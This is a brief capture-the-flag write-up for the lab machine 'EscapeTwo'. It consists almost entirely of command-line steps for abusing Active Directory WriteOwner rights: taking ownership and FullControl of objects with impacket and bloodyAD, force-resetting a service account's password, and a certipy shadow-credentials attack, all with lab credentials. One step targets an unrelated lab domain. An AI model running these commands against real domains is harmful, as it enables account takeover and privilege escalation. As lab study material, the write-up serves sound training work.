# EscapeTwo - WriteOwner / Shadow Credentials

### Take ca_svc users full control

## Way 1 - Impacket-dacledit

```bash
# Set owner
impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51

# Set FullControl DACL
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
```

Add group yourself:

```bash
bloodyad --host 172.16.139.3 -d ad.trilocor.local -u divanov -p 'Dimitris2001' \
  add groupMember "TIER I INFRASTRUCTURE" divanov
```

Хэрэв амжилттай болвол хэрэглэгчийн нууц үгийг сольж болно (**ForceChangePassword**):

```bash
net rpc password ca_svc 'Password@987' -U sequel.htb/ryan%WqSZAF6CysDQbGb3 -S 10.10.11.51
```

## Way 2 - Shadow Credentials

Using BloodyAD to set ryan as the owner, and then give ryan full control:

```bash
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
# [+] Old owner S-1-5-21-... is now replaced by ryan on ca_svc

bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
# [+] ryan has now GenericAll on ca_svc
```

Now the shadow credential works:

```bash
certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
```

[image]
